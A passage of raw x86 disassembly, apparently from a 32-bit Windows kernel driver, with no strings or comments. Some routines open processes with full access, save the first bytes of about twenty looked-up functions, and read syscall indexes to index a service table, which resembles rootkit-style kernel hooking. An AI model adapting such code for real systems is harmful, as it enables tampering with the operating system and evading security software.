   157c5:	test   cx,cx
   157c8:	jne    0x157c0
   157ca:	sub    eax,edx
   157cc:	sar    eax,1
   157ce:	mov    ecx,esi
   157d0:	sub    ecx,eax
   157d2:	push   ecx
   157d3:	mov    esi,DWORD PTR [ebp-0x24]
   157d6:	lea    eax,[esi+0x5e]
   157d9:	push   eax
   157da:	push   DWORD PTR [ebp-0x1c]
   157dd:	call   DWORD PTR ds:0x1b190
   157e3:	add    esp,0xc
   157e6:	mov    DWORD PTR [ebp-0x4],edi
   157e9:	jmp    0x1580e
   157eb:	xor    eax,eax
   157ed:	inc    eax
   157ee:	ret    
   157ef:	mov    esp,DWORD PTR [ebp-0x18]
   157f2:	mov    ebx,0x208
   157f7:	push   ebx
   157f8:	push   0x0
   157fa:	push   DWORD PTR [ebp-0x1c]
   157fd:	call   0x1a1b0
   15802:	add    esp,0xc
   15805:	push   0xfffffffe
   15807:	pop    edi
   15808:	mov    DWORD PTR [ebp-0x4],edi
   1580b:	mov    esi,DWORD PTR [ebp-0x24]
   1580e:	push   0x0
   15810:	push   DWORD PTR [ebp-0x1c]
   15813:	push   0x4
   15815:	call   0x11902
   1581a:	test   eax,eax
   1581c:	je     0x15892
   1581e:	mov    DWORD PTR [ebp-0x4],0x1
   15825:	mov    ecx,DWORD PTR [ebp-0x28]
   15828:	mov    eax,DWORD PTR [esi]
   1582a:	test   ecx,ecx
   1582c:	je     0x15866
   1582e:	test   eax,eax
   15830:	jne    0x1586d
   15832:	mov    eax,DWORD PTR [ebp+0x1c]
   15835:	and    DWORD PTR [eax],0x0
   15838:	mov    DWORD PTR [ebp-0x4],edi
   1583b:	xor    edi,edi
   1583d:	cmp    DWORD PTR [ebp-0x20],edi
   15840:	je     0x1584c
   15842:	push   edi
   15843:	push   DWORD PTR [ebp-0x20]
   15846:	call   DWORD PTR ds:0x1b278
   1584c:	cmp    DWORD PTR [ebp-0x1c],edi
   1584f:	je     0x1585b
   15851:	push   edi
   15852:	push   DWORD PTR [ebp-0x1c]
   15855:	call   DWORD PTR ds:0x1b278
   1585b:	mov    eax,DWORD PTR [ebp-0x2c]
   1585e:	call   0x1a20d
   15863:	ret    0x2c
   15866:	test   eax,eax
   15868:	je     0x15871
   1586a:	mov    ecx,DWORD PTR [ebp+0x1c]
   1586d:	add    DWORD PTR [ecx],eax
   1586f:	jmp    0x15878
   15871:	mov    DWORD PTR [ebp-0x2c],0xc000000f
   15878:	mov    DWORD PTR [ebp-0x4],edi
   1587b:	jmp    0x15892
   1587d:	xor    eax,eax
   1587f:	inc    eax
   15880:	ret    
   15881:	mov    esp,DWORD PTR [ebp-0x18]
   15884:	push   0xfffffffe
   15886:	pop    edi
   15887:	mov    DWORD PTR [ebp-0x4],edi
   1588a:	mov    ebx,0x208
   1588f:	mov    esi,DWORD PTR [ebp-0x24]
   15892:	mov    DWORD PTR [ebp-0x4],0x2
   15899:	mov    eax,DWORD PTR [esi]
   1589b:	test   eax,eax
   1589d:	je     0x158a9
   1589f:	mov    DWORD PTR [ebp-0x28],esi
   158a2:	add    esi,eax
   158a4:	mov    DWORD PTR [ebp-0x24],esi
   158a7:	jmp    0x158ad
   158a9:	and    DWORD PTR [ebp-0x24],0x0
   158ad:	mov    DWORD PTR [ebp-0x4],edi
   158b0:	jmp    0x1568f
   158b5:	xor    eax,eax
   158b7:	inc    eax
   158b8:	ret    
   158b9:	mov    esp,DWORD PTR [ebp-0x18]
   158bc:	and    DWORD PTR [ebp-0x24],0x0
   158c0:	push   0xfffffffe
   158c2:	pop    edi
   158c3:	mov    DWORD PTR [ebp-0x4],edi
   158c6:	mov    ebx,0x208
   158cb:	jmp    0x1568f
   158d0:	int3   
   158d1:	int3   
   158d2:	int3   
   158d3:	int3   
   158d4:	int3   
   158d5:	int3   
   158d6:	mov    edi,edi
   158d8:	push   ebp
   158d9:	mov    ebp,esp
   158db:	push   DWORD PTR [ebp+0x8]
   158de:	call   DWORD PTR ds:0x1b130
   158e4:	test   al,al
   158e6:	je     0x158fc
   158e8:	push   DWORD PTR [ebp+0x8]
   158eb:	call   0x11c14
   158f0:	test   eax,eax
   158f2:	je     0x158f8
   158f4:	mov    BYTE PTR [eax+0x4],0x1
   158f8:	xor    eax,eax
   158fa:	jmp    0x15901
   158fc:	mov    eax,0xc000009a
   15901:	pop    ebp
   15902:	ret    0x4
   15905:	int3   
   15906:	int3   
   15907:	int3   
   15908:	int3   
   15909:	int3   
   1590a:	mov    edi,edi
   1590c:	push   ebp
   1590d:	mov    ebp,esp
   1590f:	push   DWORD PTR [ebp+0x8]
   15912:	call   DWORD PTR ds:0x1b130
   15918:	test   al,al
   1591a:	je     0x1592e
   1591c:	cmp    BYTE PTR [ebp+0xc],0x0
   15920:	jne    0x1592a
   15922:	push   DWORD PTR [ebp+0x8]
   15925:	call   0x158d6
   1592a:	xor    eax,eax
   1592c:	jmp    0x15933
   1592e:	mov    eax,0xc000000d
   15933:	pop    ebp
   15934:	ret    0x8
   15937:	int3   
   15938:	int3   
   15939:	int3   
   1593a:	int3   
   1593b:	int3   
   1593c:	mov    edi,edi
   1593e:	push   ebp
   1593f:	mov    ebp,esp
   15941:	pop    ebp
   15942:	jmp    0x158d6
   15947:	int3   
   15948:	int3   
   15949:	int3   
   1594a:	int3   
   1594b:	int3   
   1594c:	push   0x47c
   15951:	push   0x1b5b0
   15956:	call   0x1a38c
   1595b:	mov    esi,DWORD PTR [ebp+0x8]
   1595e:	mov    DWORD PTR [ebp-0x44c],esi
   15964:	xor    ebx,ebx
   15966:	mov    DWORD PTR [ebp-0x438],ebx
   1596c:	mov    BYTE PTR [ebp-0x42d],bl
   15972:	lea    eax,[ebp-0x438]
   15978:	push   eax
   15979:	lea    eax,[ebp-0x434]
   1597f:	push   eax
   15980:	call   0x134ae
   15985:	test   al,al
   15987:	je     0x15bb9
   1598d:	xor    eax,eax
   1598f:	lea    edi,[ebp-0x454]
   15995:	stos   DWORD PTR es:[edi],eax
   15996:	stos   DWORD PTR es:[edi],eax
   15997:	mov    eax,DWORD PTR [ebp-0x438]
   1599d:	mov    DWORD PTR [ebp-0x454],eax
   159a3:	push   0x18
   159a5:	pop    edi
   159a6:	mov    DWORD PTR [ebp-0x46c],edi
   159ac:	mov    DWORD PTR [ebp-0x468],ebx
   159b2:	mov    DWORD PTR [ebp-0x460],0x200
   159bc:	mov    DWORD PTR [ebp-0x464],ebx
   159c2:	mov    DWORD PTR [ebp-0x45c],ebx
   159c8:	mov    DWORD PTR [ebp-0x458],ebx
   159ce:	lea    eax,[ebp-0x454]
   159d4:	push   eax
   159d5:	lea    eax,[ebp-0x46c]
   159db:	push   eax
   159dc:	push   0x1f0fff
   159e1:	lea    eax,[ebp-0x43c]
   159e7:	push   eax
   159e8:	call   DWORD PTR ds:0x1b1f0
   159ee:	cmp    eax,ebx
   159f0:	jne    0x15bb3
   159f6:	lea    eax,[ebp-0x438]
   159fc:	push   eax
   159fd:	push   edi
   159fe:	lea    eax,[ebp-0x48c]
   15a04:	push   eax
   15a05:	push   ebx
   15a06:	push   DWORD PTR [ebp-0x43c]
   15a0c:	call   DWORD PTR ds:0x1b150
   15a12:	cmp    eax,ebx
   15a14:	jne    0x15ba7
   15a1a:	push   edi
   15a1b:	push   ebx
   15a1c:	call   DWORD PTR ds:0x1b124
   15a22:	mov    edx,eax
   15a24:	mov    DWORD PTR [ebp-0x440],edx
   15a2a:	cmp    edx,ebx
   15a2c:	je     0x15ba7
   15a32:	push   0x6
   15a34:	pop    ecx
   15a35:	xor    eax,eax
   15a37:	mov    edi,edx
   15a39:	rep stos DWORD PTR es:[edi],eax
   15a3b:	push   edx
   15a3c:	push   DWORD PTR [ebp-0x434]
   15a42:	call   DWORD PTR ds:0x1b214
   15a48:	mov    DWORD PTR [ebp-0x4],ebx
   15a4b:	mov    eax,DWORD PTR [ebp-0x488]
   15a51:	mov    DWORD PTR [ebp-0x434],eax
   15a57:	cmp    eax,ebx
   15a59:	je     0x15ac7
   15a5b:	push   0x1ac4a
   15a60:	lea    eax,[ebp-0x474]
   15a66:	push   eax
   15a67:	mov    edi,DWORD PTR ds:0x1b164
   15a6d:	call   edi
   15a6f:	push   0x208
   15a74:	push   ebx
   15a75:	lea    eax,[ebp-0x42c]
   15a7b:	push   eax
   15a7c:	call   0x1a1b0
   15a81:	add    esp,0xc
   15a84:	lea    eax,[ebp-0x42c]
   15a8a:	push   eax
   15a8b:	lea    eax,[ebp-0x448]
   15a91:	push   eax
   15a92:	call   edi
   15a94:	mov    WORD PTR [ebp-0x446],0x208
   15a9d:	lea    eax,[ebp-0x448]
   15aa3:	push   eax
   15aa4:	lea    eax,[ebp-0x474]
   15aaa:	push   eax
   15aab:	mov    eax,DWORD PTR [ebp-0x434]
   15ab1:	mov    eax,DWORD PTR [eax+0x10]
   15ab4:	push   DWORD PTR [eax+0x48]
   15ab7:	call   0x10c1a
   15abc:	cmp    eax,ebx
   15abe:	jne    0x15ac7
   15ac0:	mov    BYTE PTR [ebp-0x42d],0x1
   15ac7:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15ace:	jmp    0x15ae6
   15ad0:	xor    eax,eax
   15ad2:	inc    eax
   15ad3:	ret    
   15ad4:	mov    esp,DWORD PTR [ebp-0x18]
   15ad7:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15ade:	xor    ebx,ebx
   15ae0:	mov    esi,DWORD PTR [ebp-0x44c]
   15ae6:	push   DWORD PTR [ebp-0x440]
   15aec:	call   DWORD PTR ds:0x1b210
   15af2:	push   ebx
   15af3:	push   DWORD PTR [ebp-0x440]
   15af9:	call   DWORD PTR ds:0x1b278
   15aff:	cmp    BYTE PTR [ebp-0x42d],bl
   15b05:	je     0x15ba7
   15b0b:	mov    BYTE PTR [ebp-0x42d],bl
   15b11:	push   0x208
   15b16:	push   ebx
   15b17:	lea    eax,[ebp-0x224]
   15b1d:	push   eax
   15b1e:	call   0x1a1b0
   15b23:	movzx  eax,WORD PTR [esi+0x2]
   15b27:	push   eax
   15b28:	push   ebx
   15b29:	push   DWORD PTR [esi+0x4]
   15b2c:	call   0x1a1b0
   15b31:	add    esp,0x18
   15b34:	mov    WORD PTR [esi],bx
   15b37:	push   0x1a634
   15b3c:	push   esi
   15b3d:	mov    edi,DWORD PTR ds:0x1b280
   15b43:	call   edi
   15b45:	lea    eax,[ebp-0x448]
   15b4b:	push   eax
   15b4c:	push   esi
   15b4d:	call   DWORD PTR ds:0x1b20c
   15b53:	push   ebx
   15b54:	movzx  eax,WORD PTR [esi]
   15b57:	push   eax
   15b58:	push   DWORD PTR [esi+0x4]
   15b5b:	push   0x104
   15b60:	lea    eax,[ebp-0x224]
   15b66:	push   eax
   15b67:	call   0x12610
   15b6c:	movzx  eax,WORD PTR [esi+0x2]
   15b70:	push   eax
   15b71:	push   ebx
   15b72:	push   DWORD PTR [esi+0x4]
   15b75:	cmp    WORD PTR [ebp-0x224],bx
   15b7c:	je     0x15b9c
   15b7e:	call   0x1a1b0
   15b83:	add    esp,0xc
   15b86:	mov    WORD PTR [esi],bx
   15b89:	lea    eax,[ebp-0x224]
   15b8f:	push   eax
   15b90:	push   esi
   15b91:	call   edi
   15b93:	mov    BYTE PTR [ebp-0x42d],0x1
   15b9a:	jmp    0x15ba7
   15b9c:	call   0x1a1b0
   15ba1:	add    esp,0xc
   15ba4:	mov    WORD PTR [esi],bx
   15ba7:	push   DWORD PTR [ebp-0x43c]
   15bad:	call   DWORD PTR ds:0x1b180
   15bb3:	mov    al,BYTE PTR [ebp-0x42d]
   15bb9:	call   0x1a3d4
   15bbe:	ret    0x4
   15bc1:	int3   
   15bc2:	int3   
   15bc3:	int3   
   15bc4:	int3   
   15bc5:	int3   
   15bc6:	mov    edi,edi
   15bc8:	push   ebp
   15bc9:	mov    ebp,esp
   15bcb:	sub    esp,0x78
   15bce:	or     DWORD PTR [ebp-0x70],0xffffffff
   15bd2:	push   edi
   15bd3:	xor    edi,edi
   15bd5:	lea    eax,[ebp-0x74]
   15bd8:	push   eax
   15bd9:	push   edi
   15bda:	push   edi
   15bdb:	push   edi
   15bdc:	push   0x1c340
   15be1:	mov    BYTE PTR [ebp-0x78],0x0
   15be5:	mov    BYTE PTR [ebp-0x9],0x0
   15be9:	mov    BYTE PTR [ebp-0x3],0x0
   15bed:	mov    BYTE PTR [ebp-0x7],0x0
   15bf1:	mov    BYTE PTR [ebp-0x5],0x0
   15bf5:	mov    BYTE PTR [ebp-0x1],0x0
   15bf9:	mov    BYTE PTR [ebp-0x2],0x0
   15bfd:	mov    BYTE PTR [ebp-0x4],0x0
   15c01:	mov    BYTE PTR [ebp-0x6],0x0
   15c05:	mov    BYTE PTR [ebp-0x8],0x0
   15c09:	mov    BYTE PTR [ebp-0xa],0x0
   15c0d:	mov    DWORD PTR [ebp-0x1c],edi
   15c10:	mov    DWORD PTR [ebp-0x10],edi
   15c13:	mov    DWORD PTR [ebp-0x2c],edi
   15c16:	mov    DWORD PTR [ebp-0x34],edi
   15c19:	mov    DWORD PTR [ebp-0x24],edi
   15c1c:	mov    DWORD PTR [ebp-0x18],edi
   15c1f:	mov    DWORD PTR [ebp-0x28],edi
   15c22:	mov    DWORD PTR [ebp-0x20],edi
   15c25:	mov    DWORD PTR [ebp-0x30],edi
   15c28:	mov    DWORD PTR [ebp-0x14],edi
   15c2b:	mov    DWORD PTR [ebp-0x44],edi
   15c2e:	mov    DWORD PTR [ebp-0x64],edi
   15c31:	mov    DWORD PTR [ebp-0x54],edi
   15c34:	mov    DWORD PTR [ebp-0x38],edi
   15c37:	mov    DWORD PTR [ebp-0x58],edi
   15c3a:	mov    DWORD PTR [ebp-0x68],edi
   15c3d:	mov    DWORD PTR [ebp-0x5c],edi
   15c40:	mov    DWORD PTR [ebp-0x3c],edi
   15c43:	mov    DWORD PTR [ebp-0x60],edi
   15c46:	mov    DWORD PTR [ebp-0x40],edi
   15c49:	mov    DWORD PTR [ebp-0x48],edi
   15c4c:	mov    DWORD PTR [ebp-0x74],0xfe363c80
   15c53:	call   DWORD PTR ds:0x1b110
   15c59:	test   eax,eax
   15c5b:	jne    0x169a7
   15c61:	cmp    BYTE PTR ds:0x1bf94,al
   15c67:	push   ebx
   15c68:	push   esi
   15c69:	jne    0x16035
   15c6f:	mov    eax,ds:0x1bfc0
   15c74:	cmp    eax,edi
   15c76:	je     0x16035
   15c7c:	push   0x1aef4
   15c81:	push   eax
   15c82:	call   0x10ffc
   15c87:	mov    ebx,DWORD PTR ds:0x1b124
   15c8d:	mov    esi,eax
   15c8f:	cmp    esi,edi
   15c91:	je     0x15caa
   15c93:	push   0x14
   15c95:	push   edi
   15c96:	call   ebx
   15c98:	cmp    eax,edi
   15c9a:	mov    ds:0x1bffc,eax
   15c9f:	je     0x15caa
   15ca1:	push   0x5
   15ca3:	pop    ecx
   15ca4:	mov    edi,eax
   15ca6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15ca8:	xor    edi,edi
   15caa:	push   0x1aee6
   15caf:	push   DWORD PTR ds:0x1bfc0
   15cb5:	call   0x10ffc
   15cba:	mov    esi,eax
   15cbc:	cmp    esi,edi
   15cbe:	je     0x15cd7
   15cc0:	push   0x14
   15cc2:	push   edi
   15cc3:	call   ebx
   15cc5:	cmp    eax,edi
   15cc7:	mov    ds:0x1c000,eax
   15ccc:	je     0x15cd7
   15cce:	push   0x5
   15cd0:	pop    ecx
   15cd1:	mov    edi,eax
   15cd3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15cd5:	xor    edi,edi
   15cd7:	push   0x1aeda
   15cdc:	push   DWORD PTR ds:0x1bfc0
   15ce2:	call   0x10ffc
   15ce7:	mov    esi,eax
   15ce9:	cmp    esi,edi
   15ceb:	je     0x15d04
   15ced:	push   0x14
   15cef:	push   edi
   15cf0:	call   ebx
   15cf2:	cmp    eax,edi
   15cf4:	mov    ds:0x1c004,eax
   15cf9:	je     0x15d04
   15cfb:	push   0x5
   15cfd:	pop    ecx
   15cfe:	mov    edi,eax
   15d00:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15d02:	xor    edi,edi
   15d04:	push   0x1aecc
   15d09:	push   DWORD PTR ds:0x1bfc0
   15d0f:	call   0x10ffc
   15d14:	mov    esi,eax
   15d16:	cmp    esi,edi
   15d18:	je     0x15d31
   15d1a:	push   0x14
   15d1c:	push   edi
   15d1d:	call   ebx
   15d1f:	cmp    eax,edi
   15d21:	mov    ds:0x1c008,eax
   15d26:	je     0x15d31
   15d28:	push   0x5
   15d2a:	pop    ecx
   15d2b:	mov    edi,eax
   15d2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15d2f:	xor    edi,edi
   15d31:	push   0x1aec0
   15d36:	push   DWORD PTR ds:0x1bfc0
   15d3c:	call   0x10ffc
   15d41:	mov    esi,eax
   15d43:	cmp    esi,edi
   15d45:	je     0x15d5e
   15d47:	push   0x14
   15d49:	push   edi
   15d4a:	call   ebx
   15d4c:	cmp    eax,edi
   15d4e:	mov    ds:0x1c00c,eax
   15d53:	je     0x15d5e
   15d55:	push   0x5
   15d57:	pop    ecx
   15d58:	mov    edi,eax
   15d5a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15d5c:	xor    edi,edi
   15d5e:	push   0x1aeaa
   15d63:	push   DWORD PTR ds:0x1bfc0
   15d69:	call   0x10ffc
   15d6e:	mov    esi,eax
   15d70:	cmp    esi,edi
   15d72:	je     0x15d8b
   15d74:	push   0x14
   15d76:	push   edi
   15d77:	call   ebx
   15d79:	cmp    eax,edi
   15d7b:	mov    ds:0x1c010,eax
   15d80:	je     0x15d8b
   15d82:	push   0x5
   15d84:	pop    ecx
   15d85:	mov    edi,eax
   15d87:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15d89:	xor    edi,edi
   15d8b:	push   0x1ae92
   15d90:	push   DWORD PTR ds:0x1bfc0
   15d96:	call   0x10ffc
   15d9b:	mov    esi,eax
   15d9d:	cmp    esi,edi
   15d9f:	je     0x15db8
   15da1:	push   0x14
   15da3:	push   edi
   15da4:	call   ebx
   15da6:	cmp    eax,edi
   15da8:	mov    ds:0x1c014,eax
   15dad:	je     0x15db8
   15daf:	push   0x5
   15db1:	pop    ecx
   15db2:	mov    edi,eax
   15db4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15db6:	xor    edi,edi
   15db8:	push   0x1ae78
   15dbd:	push   DWORD PTR ds:0x1bfc0
   15dc3:	call   0x10ffc
   15dc8:	mov    esi,eax
   15dca:	cmp    esi,edi
   15dcc:	je     0x15de5
   15dce:	push   0x14
   15dd0:	push   edi
   15dd1:	call   ebx
   15dd3:	cmp    eax,edi
   15dd5:	mov    ds:0x1c018,eax
   15dda:	je     0x15de5
   15ddc:	push   0x5
   15dde:	pop    ecx
   15ddf:	mov    edi,eax
   15de1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15de3:	xor    edi,edi
   15de5:	push   0x1ae5e
   15dea:	push   DWORD PTR ds:0x1bfc0
   15df0:	call   0x10ffc
   15df5:	mov    esi,eax
   15df7:	cmp    esi,edi
   15df9:	je     0x15e12
   15dfb:	push   0x14
   15dfd:	push   edi
   15dfe:	call   ebx
   15e00:	cmp    eax,edi
   15e02:	mov    ds:0x1c01c,eax
   15e07:	je     0x15e12
   15e09:	push   0x5
   15e0b:	pop    ecx
   15e0c:	mov    edi,eax
   15e0e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15e10:	xor    edi,edi
   15e12:	push   0x1ae44
   15e17:	push   DWORD PTR ds:0x1bfc0
   15e1d:	call   0x10ffc
   15e22:	mov    esi,eax
   15e24:	cmp    esi,edi
   15e26:	je     0x15e3f
   15e28:	push   0x14
   15e2a:	push   edi
   15e2b:	call   ebx
   15e2d:	cmp    eax,edi
   15e2f:	mov    ds:0x1c020,eax
   15e34:	je     0x15e3f
   15e36:	push   0x5
   15e38:	pop    ecx
   15e39:	mov    edi,eax
   15e3b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15e3d:	xor    edi,edi
   15e3f:	push   0x1ae34
   15e44:	push   DWORD PTR ds:0x1bfc0
   15e4a:	call   0x10ffc
   15e4f:	mov    esi,eax
   15e51:	cmp    esi,edi
   15e53:	je     0x15e6c
   15e55:	push   0x14
   15e57:	push   edi
   15e58:	call   ebx
   15e5a:	cmp    eax,edi
   15e5c:	mov    ds:0x1c024,eax
   15e61:	je     0x15e6c
   15e63:	push   0x5
   15e65:	pop    ecx
   15e66:	mov    edi,eax
   15e68:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15e6a:	xor    edi,edi
   15e6c:	push   0x1ae24
   15e71:	push   DWORD PTR ds:0x1bfc0
   15e77:	call   0x10ffc
   15e7c:	mov    esi,eax
   15e7e:	cmp    esi,edi
   15e80:	je     0x15e99
   15e82:	push   0x14
   15e84:	push   edi
   15e85:	call   ebx
   15e87:	cmp    eax,edi
   15e89:	mov    ds:0x1c028,eax
   15e8e:	je     0x15e99
   15e90:	push   0x5
   15e92:	pop    ecx
   15e93:	mov    edi,eax
   15e95:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15e97:	xor    edi,edi
   15e99:	push   0x1ae12
   15e9e:	push   DWORD PTR ds:0x1bfc0
   15ea4:	call   0x10ffc
   15ea9:	mov    esi,eax
   15eab:	cmp    esi,edi
   15ead:	je     0x15ec6
   15eaf:	push   0x14
   15eb1:	push   edi
   15eb2:	call   ebx
   15eb4:	cmp    eax,edi
   15eb6:	mov    ds:0x1c02c,eax
   15ebb:	je     0x15ec6
   15ebd:	push   0x5
   15ebf:	pop    ecx
   15ec0:	mov    edi,eax
   15ec2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15ec4:	xor    edi,edi
   15ec6:	push   0x1adfe
   15ecb:	push   DWORD PTR ds:0x1bfc0
   15ed1:	call   0x10ffc
   15ed6:	mov    esi,eax
   15ed8:	cmp    esi,edi
   15eda:	je     0x15ef3
   15edc:	push   0x14
   15ede:	push   edi
   15edf:	call   ebx
   15ee1:	cmp    eax,edi
   15ee3:	mov    ds:0x1c030,eax
   15ee8:	je     0x15ef3
   15eea:	push   0x5
   15eec:	pop    ecx
   15eed:	mov    edi,eax
   15eef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15ef1:	xor    edi,edi
   15ef3:	push   0x1adea
   15ef8:	push   DWORD PTR ds:0x1bfc0
   15efe:	call   0x10ffc
   15f03:	mov    esi,eax
   15f05:	cmp    esi,edi
   15f07:	je     0x15f20
   15f09:	push   0x14
   15f0b:	push   edi
   15f0c:	call   ebx
   15f0e:	cmp    eax,edi
   15f10:	mov    ds:0x1c034,eax
   15f15:	je     0x15f20
   15f17:	push   0x5
   15f19:	pop    ecx
   15f1a:	mov    edi,eax
   15f1c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15f1e:	xor    edi,edi
   15f20:	push   0x1adde
   15f25:	push   DWORD PTR ds:0x1bfc0
   15f2b:	call   0x10ffc
   15f30:	mov    esi,eax
   15f32:	cmp    esi,edi
   15f34:	je     0x15f4d
   15f36:	push   0x14
   15f38:	push   edi
   15f39:	call   ebx
   15f3b:	cmp    eax,edi
   15f3d:	mov    ds:0x1c038,eax
   15f42:	je     0x15f4d
   15f44:	push   0x5
   15f46:	pop    ecx
   15f47:	mov    edi,eax
   15f49:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15f4b:	xor    edi,edi
   15f4d:	push   0x1add0
   15f52:	push   DWORD PTR ds:0x1bfc0
   15f58:	call   0x10ffc
   15f5d:	mov    esi,eax
   15f5f:	cmp    esi,edi
   15f61:	je     0x15f7a
   15f63:	push   0x14
   15f65:	push   edi
   15f66:	call   ebx
   15f68:	cmp    eax,edi
   15f6a:	mov    ds:0x1c03c,eax
   15f6f:	je     0x15f7a
   15f71:	push   0x5
   15f73:	pop    ecx
   15f74:	mov    edi,eax
   15f76:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15f78:	xor    edi,edi
   15f7a:	push   0x1adb4
   15f7f:	push   DWORD PTR ds:0x1bfc0
   15f85:	call   0x10ffc
   15f8a:	mov    esi,eax
   15f8c:	cmp    esi,edi
   15f8e:	je     0x15fa7
   15f90:	push   0x14
   15f92:	push   edi
   15f93:	call   ebx
   15f95:	cmp    eax,edi
   15f97:	mov    ds:0x1c040,eax
   15f9c:	je     0x15fa7
   15f9e:	push   0x5
   15fa0:	pop    ecx
   15fa1:	mov    edi,eax
   15fa3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15fa5:	xor    edi,edi
   15fa7:	push   0x1ad94
   15fac:	push   DWORD PTR ds:0x1bfc0
   15fb2:	call   0x10ffc
   15fb7:	mov    esi,eax
   15fb9:	cmp    esi,edi
   15fbb:	je     0x15fd4
   15fbd:	push   0x14
   15fbf:	push   edi
   15fc0:	call   ebx
   15fc2:	cmp    eax,edi
   15fc4:	mov    ds:0x1c044,eax
   15fc9:	je     0x15fd4
   15fcb:	push   0x5
   15fcd:	pop    ecx
   15fce:	mov    edi,eax
   15fd0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15fd2:	xor    edi,edi
   15fd4:	push   0x1ad74
   15fd9:	push   DWORD PTR ds:0x1bfc0
   15fdf:	call   0x10ffc
   15fe4:	mov    esi,eax
   15fe6:	cmp    esi,edi
   15fe8:	je     0x16001
   15fea:	push   0x14
   15fec:	push   edi
   15fed:	call   ebx
   15fef:	cmp    eax,edi
   15ff1:	mov    ds:0x1c048,eax
   15ff6:	je     0x16001
   15ff8:	push   0x5
   15ffa:	pop    ecx
   15ffb:	mov    edi,eax
   15ffd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   15fff:	xor    edi,edi
   16001:	push   0x1ad54
   16006:	push   DWORD PTR ds:0x1bfc0
   1600c:	call   0x10ffc
   16011:	mov    esi,eax
   16013:	cmp    esi,edi
   16015:	je     0x1602e
   16017:	push   0x14
   16019:	push   edi
   1601a:	call   ebx
   1601c:	cmp    eax,edi
   1601e:	mov    ds:0x1c04c,eax
   16023:	je     0x1602e
   16025:	push   0x5
   16027:	pop    ecx
   16028:	mov    edi,eax
   1602a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1602c:	xor    edi,edi
   1602e:	mov    BYTE PTR ds:0x1bf94,0x1
   16035:	push   0x1ad46
   1603a:	call   0x10bb8
   1603f:	mov    esi,eax
   16041:	cmp    esi,edi
   16043:	mov    DWORD PTR ds:0x1bfbc,esi
   16049:	je     0x16463
   1604f:	push   0x1aef4
   16054:	push   esi
   16055:	call   0x10ffc
   1605a:	test   eax,eax
   1605c:	mov    edi,DWORD PTR ds:0x1b17c
   16062:	mov    DWORD PTR [ebp-0x24],eax
   16065:	jne    0x16077
   16067:	mov    eax,ds:0x1b218
   1606c:	mov    eax,DWORD PTR [eax+0x1]
   1606f:	mov    ecx,DWORD PTR [edi]
   16071:	mov    eax,DWORD PTR [ecx+eax*4]
   16074:	mov    DWORD PTR [ebp-0x24],eax
   16077:	push   0x1aee6
   1607c:	push   esi
   1607d:	call   0x10ffc
   16082:	test   eax,eax
   16084:	mov    DWORD PTR [ebp-0x18],eax
   16087:	jne    0x16099
   16089:	mov    eax,ds:0x1b1f0
   1608e:	mov    eax,DWORD PTR [eax+0x1]
   16091:	mov    ecx,DWORD PTR [edi]
   16093:	mov    eax,DWORD PTR [ecx+eax*4]
   16096:	mov    DWORD PTR [ebp-0x18],eax
   16099:	push   0x1aeda
   1609e:	push   esi
   1609f:	call   0x10ffc
   160a4:	test   eax,eax
   160a6:	mov    DWORD PTR [ebp-0x28],eax
   160a9:	jne    0x160bb
   160ab:	mov    eax,ds:0x1b18c
   160b0:	mov    eax,DWORD PTR [eax+0x1]
   160b3:	mov    ecx,DWORD PTR [edi]
   160b5:	mov    eax,DWORD PTR [ecx+eax*4]
   160b8:	mov    DWORD PTR [ebp-0x28],eax
   160bb:	push   0x1aec0
   160c0:	push   esi
   160c1:	call   0x10ffc
   160c6:	test   eax,eax
   160c8:	mov    DWORD PTR [ebp-0x30],eax
   160cb:	jne    0x160dd
   160cd:	mov    eax,ds:0x1b1dc
   160d2:	mov    eax,DWORD PTR [eax+0x1]
   160d5:	mov    ecx,DWORD PTR [edi]
   160d7:	mov    eax,DWORD PTR [ecx+eax*4]
   160da:	mov    DWORD PTR [ebp-0x30],eax
   160dd:	push   0x1aecc
   160e2:	push   esi
   160e3:	call   0x10ffc
   160e8:	test   eax,eax
   160ea:	mov    DWORD PTR [ebp-0x20],eax
   160ed:	jne    0x160ff
   160ef:	mov    eax,ds:0x1b1e0
   160f4:	mov    eax,DWORD PTR [eax+0x1]
   160f7:	mov    ecx,DWORD PTR [edi]
   160f9:	mov    eax,DWORD PTR [ecx+eax*4]
   160fc:	mov    DWORD PTR [ebp-0x20],eax
   160ff:	push   0x1aeaa
   16104:	push   esi
   16105:	call   0x10ffc
   1610a:	test   eax,eax
   1610c:	mov    DWORD PTR [ebp-0x14],eax
   1610f:	jne    0x16121
   16111:	mov    eax,ds:0x1b1e8
   16116:	mov    eax,DWORD PTR [eax+0x1]
   16119:	mov    ecx,DWORD PTR [edi]
   1611b:	mov    eax,DWORD PTR [ecx+eax*4]
   1611e:	mov    DWORD PTR [ebp-0x14],eax
   16121:	push   0x1adb4
   16126:	push   esi
   16127:	call   0x10ffc
   1612c:	test   eax,eax
   1612e:	mov    ebx,DWORD PTR ds:0x1b164
   16134:	mov    DWORD PTR [ebp-0x1c],eax
   16137:	jne    0x1615d
   16139:	push   0x1ad0e
